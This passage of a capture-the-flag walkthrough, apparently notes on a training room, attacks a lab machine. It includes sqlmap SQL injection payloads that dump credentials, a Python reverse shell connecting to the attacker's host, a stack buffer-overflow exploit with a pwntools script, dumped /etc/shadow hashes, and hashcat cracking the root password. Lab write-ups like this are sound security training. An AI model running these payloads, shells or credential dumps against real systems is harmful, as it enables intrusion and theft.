@@ -1687,3 +1687,848 @@ Program received signal SIGSEGV, Segmentation fault.
 0x6161616c in ?? ()
 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 ────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────
+ EAX  0x1
+ EBX  0x0
+ ECX  0x1
+ EDX  0xf76e087c (_IO_stdfile_0_lock) ◂— 0
+ EDI  0xf76df000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
+ ESI  0xf76df000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
+ EBP  0x6161616b ('kaaa')
+ ESP  0xffb7cb40 ◂— 0xf700616d /* 'ma' */
+ EIP  0x6161616c ('laaa')
+──────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────
+Invalid address 0x6161616c
+
+──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
+00:0000│ esp  0xffb7cb40 ◂— 0xf700616d /* 'ma' */
+01:0004│      0xffb7cb44 —▸ 0xffb7cb60 ◂— 0x1
+02:0008│      0xffb7cb48 ◂— 0x0
+03:000c│      0xffb7cb4c —▸ 0xf7545637 (__libc_start_main+247) ◂— add    esp, 0x10
+04:0010│      0xffb7cb50 —▸ 0xf76df000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
+... ↓
+06:0018│      0xffb7cb58 ◂— 0x0
+07:001c│      0xffb7cb5c —▸ 0xf7545637 (__libc_start_main+247) ◂— add    esp, 0x10
+────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
+ ► f 0 6161616c
+   f 1 f700616d
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+Program received signal SIGSEGV (fault address 0x6161616c)
+
+pwndbg> cyclic -l 0x6161616c
+44
+
+in my way
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ python3
+Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from pwn import *
+'>>> cyclic(50)
+b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama'
+>>> 'a'*50
+'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/penguin]
+└─$ gdb root
+GNU gdb (Debian 12.1-4) 12.1
+Copyright (C) 2022 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+pwndbg: loaded 142 pwndbg commands and 44 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
+pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
+Reading symbols from root...
+(No debugging symbols found in root)
+------- tip of the day (disable with set show-tips off) -------
+Use Pwndbg's config and theme commands to tune its configuration and theme colors!
+pwndbg> run
+Starting program: /home/kali/bufferoverflow/penguin/root 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
+
+Program received signal SIGSEGV, Segmentation fault.
+0x6161616c in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────
+*EAX  0x1
+*EBX  0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
+ ECX  0x0
+*EDX  0xf7fc2540 ◂— 0xf7fc2540
+*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
+*ESI  0x8048550 (__libc_csu_init) ◂— push ebp
+*EBP  0x6161616b ('kaaa')
+*ESP  0xffffcf40 ◂— 0x616d /* 'ma' */
+*EIP  0x6161616c ('laaa')
+──────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────
+Invalid address 0x6161616c
+
+──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
+00:0000│ esp 0xffffcf40 ◂— 0x616d /* 'ma' */
+01:0004│     0xffffcf44 —▸ 0xffffcf60 ◂— 0x1
+02:0008│     0xffffcf48 ◂— 0x0
+03:000c│     0xffffcf4c —▸ 0xf7c23295 (__libc_start_call_main+117) ◂— add esp, 0x10
+04:0010│     0xffffcf50 ◂— 0x0
+05:0014│     0xffffcf54 ◂— 0x70 /* 'p' */
+06:0018│     0xffffcf58 —▸ 0xf7ffcff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x33f14
+07:001c│     0xffffcf5c —▸ 0xf7c23295 (__libc_start_call_main+117) ◂— add esp, 0x10
+────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
+ ► f 0 0x6161616c
+   f 1   0x616d
+   f 2 0xffffcf60
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> cyclic -l 0x6161616c
+Lookup value: b'laaa'
+44
+```
+
+## Exploitation
+The admin page seems to give us a login form. In situations like this it is always worth it to check for "low-hanging fruit". In the case of login forms one of the first things to check for is SQL Injection.
+Recommended Tool: sqlmap
+Useful Flags:
+-u
+Specifies which url to attack
+--forms
+Automatically selects parameters from <form> elements on the page
+--dump
+Used to retrieve data from the db once SQLI is found
+-a
+Grabs just about everything from the db
+Answer the questions below
+```text
+https://www.aldeid.com/wiki/Sqlmap
+
+sqli
+
+entering ' in form
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1 (vulnerable to sqli)
+
+using sqlmap
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u http://10.10.181.221/administrator.php --forms --dump
+        ___
+       __H__                                                                                                  
+ ___ ___[.]_____ ___ ___  {1.6.12#stable}                                                                     
+|_ -| . [.]     | .'| . |                                                                                     
+|___|_  [)]_|_|_|__,|  _|                                                                                     
+      |_|V...       |_|   https://sqlmap.org                                                                  
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 22:01:06 /2022-12-26/
+
+[22:01:06] [INFO] testing connection to the target URL
+[22:01:06] [INFO] searching for forms
+[1/1] Form:
+POST http://10.10.181.221/administrator.php
+POST data: username=&password=
+do you want to test this form? [Y/n/q] 
+> Y
+Edit POST data [default: username=&password=] (Warning: blank fields detected): 
+do you want to fill blank fields with random values? [Y/n] Y
+[22:01:29] [INFO] using '/home/kali/.local/share/sqlmap/output/results-12262022_1001pm.csv' as the CSV results file in multiple targets mode
+[22:01:29] [INFO] checking if the target is protected by some kind of WAF/IPS
+[22:01:29] [INFO] testing if the target URL content is stable
+[22:01:30] [INFO] target URL content is stable
+[22:01:30] [INFO] testing if POST parameter 'username' is dynamic
+[22:01:30] [WARNING] POST parameter 'username' does not appear to be dynamic
+[22:01:30] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
+[22:01:30] [INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
+[22:01:30] [INFO] testing for SQL injection on POST parameter 'username'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[22:02:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[22:02:13] [WARNING] reflective value(s) found and filtering out
+[22:02:16] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[22:02:16] [INFO] testing 'Generic inline queries'
+[22:02:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[22:02:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[22:02:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[22:02:52] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[22:02:53] [INFO] POST parameter 'username' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --not-string="Got")                                               
+[22:02:53] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                                                                                     
+[22:02:53] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[22:02:53] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[22:02:54] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[22:02:54] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'                                                                                                         
+[22:02:54] [INFO] POST parameter 'username' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable                                                                         
+[22:02:54] [INFO] testing 'MySQL inline queries'
+[22:02:54] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[22:02:55] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[22:02:55] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[22:02:55] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[22:02:56] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[22:02:56] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[22:02:56] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[22:03:07] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[22:03:07] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[22:03:07] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[22:03:07] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[22:03:08] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[22:03:09] [INFO] target URL appears to have 2 columns in query
+do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[22:03:43] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[22:03:48] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
+[22:03:54] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
+[22:03:59] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
+[22:04:05] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
+[22:04:10] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
+[22:04:15] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
+[22:04:20] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
+[22:04:26] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
+[22:04:31] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 383 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=xeTV' RLIKE (SELECT (CASE WHEN (3282=3282) THEN 0x78655456 ELSE 0x28 END))-- FveE&password=
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: username=xeTV' AND GTID_SUBSET(CONCAT(0x71716b7871,(SELECT (ELT(1167=1167,1))),0x7170716a71),1167)-- YoHC&password=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=xeTV' AND (SELECT 6728 FROM (SELECT(SLEEP(5)))DWhE)-- zkJm&password=
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[22:04:57] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
+web application technology: Apache 2.4.18
+back-end DBMS: MySQL >= 5.6
+[22:04:59] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[22:04:59] [INFO] fetching current database
+[22:04:59] [INFO] retrieved: 'users'
+[22:04:59] [INFO] fetching tables for database: 'users'
+[22:05:00] [INFO] retrieved: 'users'
+[22:05:00] [INFO] fetching columns for table 'users' in database 'users'
+[22:05:00] [INFO] retrieved: 'username'
+[22:05:00] [INFO] retrieved: 'varchar(100)'
+[22:05:01] [INFO] retrieved: 'password'
+[22:05:01] [INFO] retrieved: 'varchar(100)'
+[22:05:01] [INFO] fetching entries for table 'users' in database 'users'
+[22:05:02] [INFO] retrieved: 'secretpass'
+[22:05:02] [INFO] retrieved: 'pingudad'
+Database: users
+Table: users
+[1 entry]
++------------+----------+
+| password   | username |
++------------+----------+
+| secretpass | pingudad |
++------------+----------+
+
+[22:05:02] [INFO] table 'users.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.181.221/dump/users/users.csv'                                                                                         
+[22:05:02] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-12262022_1001pm.csv'                                                         
+
+[*] ending @ 22:05:02 /2022-12-26/
+```
+What is the admin username?
+It is a login *form*
+*pingudad*
+What is the admin password?
+*secretpass*
+How many forms of SQLI is the form vulnerable to?
+*3*
+![[Pasted image 20221226220752.png]]
+### Command Execution
+It seems we have gained the ability to run commands! Since this is my old PC, I should still have a user account! Let's run a few test commands, and then try to gain access!
+**Method 1: nc Reverse shell:**
+This machine has been outfitted with nc, a tool that allows you to make and receive connections and send data. It is one of the most popular tools to get a reverse shell. Some great places to find reverse shell payloads are [highoncoffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/) and [Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+After this you will have to do some additional enumeration to find pingu's ssh key, or hidden password
+**Method 2: Hidden passwords:**
+Assuming my father hasn't modified since he took over my old PC, I should still have my hidden password stored somewhere,I don't recall though so you'll have to find it! `find` is the recommended tool here as it allows you to search for which files a user specifically owns.
+Answer the questions below
+```text
+after login
+
+http://10.10.181.221/2591c98b70119fe624898b1e424b5e91.php
+
+revshell
+
+https://highon.coffee/blog/reverse-shell-cheat-sheet/
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -lnvp 1337
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.10.181.221.
+Ncat: Connection from 10.10.181.221:37076.
+/bin/sh: 0: can't access tty; job control turned off
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -lnvp 1337
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.10.181.221.
+Ncat: Connection from 10.10.181.221:37076.
+/bin/sh: 0: can't access tty; job control turned off
+```
+```text
+$ export TERM=xterm
+```
+```text
+$ export SHELL=bash
+```
+```text
+$ which python3
+/usr/bin/python3
+```
+Previously we figured out that we need to provide 44 characters of input, and then we can execute whatever part of the program we want. Now the next step is to find out exactly where the shell function is in memory so we know what to set EIP to. GDB supports this as well with the disassemble command. Type disassemble shell, and this should pop up.
+![](https://imgur.com/Al8tCRy.jpg)
+What we're interested in is the hex memory addresses. So from what we know all we have to do is provide 44 characters, and then "0x080484cb" and the shell function should execute, let's try it!
+Note: Modern CPU architectures are "little endian" meaning bytes are backwards. For example "0x080484cb" would become "cb840408"
+We can use python to do this, as it allows a nice way of converting.
+Method 1 - Manual conversion:
+`python -c 'print "A"*44 + "\xcb\x84\x04\x08"'` will output the payload we want, but it requires manually converting to little endian
+Method 2 - Struct:
+`python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'`
+It requires importing a module but struct.pack allows us to automatically convert memory to little endian.
+We print 44 random characters(in this case A) and then our memory address in little endian, and shell should execute. This can be tested by piping the output in to the binary
+`python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root`should provide you with this output.
+![](https://imgur.com/ioTkGbB.jpg)
+We did it!
+Answer the questions below
+Woohoo!
+```text
+I'd already dit it :)
+
+but second method is new for me
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/penguin]
+└─$ python2 -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)' | ./root
+cat: /var/backups/shadow.bak: No such file or directory
+zsh: done                python2 -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)' | 
+zsh: segmentation fault  ./root
+
+pingu@ubuntu:/opt/secret$ python2 -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)' | ./root
+root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18277:0:99999:7:::
+uuidd:*:18277:0:99999:7:::
+papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
+Segmentation fault
+```
+Pwntools is a python library dedicated to making everything we just did in the last task much simpler. However, since it is a library, it requires python knowledge to use to it's full potential, and as such everything in this task will be done using a python script.
+We start off the script with:
+`from pwn import *   proc = process('/opt/secret/root')`
+This imports all the utilities from the pwntools library so we can use them in our script, and then creates a process that we can interact with using pwntools functions.
+We know that we need the memory address of the shell function, and pwntools provides a way to obtain that with ELF().
+ELF allows us to get various memory addresses of important points in our binary, including the memory address of the shell function.
+With the ELF addition our script becomes
+`from pwn import *   proc = process('/opt/secret/root')   elf = ELF('/opt/secret/root')   shell_func = elf.symbols.shell      `
+shell_func holds the memory address of our shell function. Now we need a way to form the payload, luckily pwntools has that to with fit().
+fit allows us to form a payload by combining characters and our memory address. To send the payload we can use a method in our `proc` variable, proc.sendline(), which just sends whatever data we want to the binary. Finally we can use proc.interactive(), to view the full output of the process.
+With all that our final exploit script becomes
+`from pwn import *   proc = process('/opt/secret/root')   elf = ELF('/opt/secret/root')   shell_func = elf.symbols.shell   payload = fit({   44: shell_func # this adds the value of shell_func after 44 characters   })   proc.sendline(payload)   proc.interactive()`
+Save that to a .py file and run it, and you should get this output:
+![](https://imgur.com/8tr5vl5.jpg)
+We did it again!
+Answer the questions below
+Even more woohoo!
+```text
+┌──(kali㉿kali)-[/tmp]
+└─$ python pwn.py 
+Traceback (most recent call last):
+  File "/tmp/pwn.py", line 1, in <module>
+    from pwn import *
+  File "/tmp/pwn.py", line 2, in <module>
+    proc = process('/home/kali/bufferoverflow/penguin/root')
+NameError: name 'process' is not defined
+```
+```text
+┌──(kali㉿kali)-[/tmp]
+└─$ cat b.py   
+from pwn import *
+proc = process('/home/kali/bufferoverflow/penguin/root')
+elf = ELF('/home/kali/bufferoverflow/penguin/root')
+shell_func = elf.symbols.shell
+payload = fit({
+44: shell_func # this adds the value of shell_func after 44 characters
+})
+proc.sendline(payload)
+proc.interactive()
+```
+```text
+┌──(kali㉿kali)-[/tmp]
+└─$ python b.py  
+[+] Starting local process '/home/kali/bufferoverflow/penguin/root': pid 481464
+[*] '/home/kali/bufferoverflow/penguin/root'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+[*] Switching to interactive mode
+cat: /var/backups/shadow.bak: No such file or directory
+[*] Got EOF while reading in interactive
+```
+```text
+$ quit
+[*] Process '/home/kali/bufferoverflow/penguin/root' stopped with exit code -11 (SIGSEGV) (pid 481464)
+[*] Got EOF while sending in interactive
+
+pingu@ubuntu:/opt/secret$ cd /tmp
+pingu@ubuntu:/tmp$ ls
+pwndbg                                                                             tmp2jvpc9hq  VMwareDnD
+systemd-private-faae3ec265c14062a14c0a64b53a0335-systemd-timesyncd.service-5MvOqe  tmpdqu4cf_8
+pingu@ubuntu:/tmp$ nano a.py
+pingu@ubuntu:/tmp$ python a.py
+[+] Starting local process '/opt/secret/root': pid 1077
+[*] '/opt/secret/root'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+[*] Switching to interactive mode
+[*] Process '/opt/secret/root' stopped with exit code -11 (SIGSEGV) (pid 1077)
+root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18277:0:99999:7:::
+uuidd:*:18277:0:99999:7:::
+papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
+[*] Got EOF while reading in interactive
+```
+### Finishing the job
+Now that we have the password hashes, we can crack them and get the root password! Recall from the previous outputs that our root password hash is "`$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.`".
+Luckily hashcat supports cracking linux password hashes. You can find a list of hashcat modes [here](https://hashcat.net/wiki/doku.php?id=example_hashes) and rockyou.txt(a popular wordlist) [here](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) (if you don't already have it on your system)
+Recommended tool - Hashcat:
+Usage: `hashcat {flags} {hashfile} {wordlist}`
+Useful flags:
+-a
+Specify attack mode,attack modes can be found in the man page.
+-m
+Specifies which mode to use, refer back to the list of modes
+Answer the questions below
+```text
+https://hashcat.net/wiki/doku.php?id=example_hashes
+
+-m 1800
+
+sha512crypt $6$, SHA512 (Unix) 2
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/penguin]
+└─$ cat penguin.hash                    
+$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/penguin]
+└─$ hashcat -m 1800 -a 0 penguin.hash /usr/share/wordlists/rockyou.txt                         
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1240/2545 MB (512 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Uses-64-Bit
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+Cracking performance lower than expected?                 
+
+* Append -O to the commandline.
+  This lowers the maximum supported password/salt length (usually down to 32).
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:love2fish
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+Hash.Target......: $6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.o...x00Ck.
+Time.Started.....: Tue Dec 27 11:34:49 2022 (7 mins, 4 secs)
+Time.Estimated...: Tue Dec 27 11:41:53 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:      567 H/s (10.82ms) @ Accel:256 Loops:128 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 239872/14344385 (1.67%)
+Rejected.........: 0/239872 (0.00%)
+Restore.Point....: 239616/14344385 (1.67%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
+Candidate.Engine.: Device Generator
+Candidates.#1....: luciole -> lossims
+Hardware.Mon.#1..: Util: 85%
+
+Started: Tue Dec 27 11:32:34 2022
+Stopped: Tue Dec 27 11:41:55 2022
+
+after 9 min :)
+
+love2fish
+```
+What is the root password!
+*love2fish*
+### Thank you!
+Now that I have the root password, I can get any fish he attempts to hide from me :).
+![](https://imgur.com/aa1eRv5.jpg)
+Further reading:
+[http://docs.pwntools.com/en/stable/](http://docs.pwntools.com/en/stable/)
+[https://browserpwndbg.readthedocs.io/en/docs/](https://browserpwndbg.readthedocs.io/en/docs/)
+Answer the questions below
+You helped me out!
+
+## Privilege Escalation
+```text
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@ubuntu:/var/www/html$ ls
+ls
+2591c98b70119fe624898b1e424b5e91.php  administrator.php  index.html
+
+www-data@ubuntu:/var/www/html$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
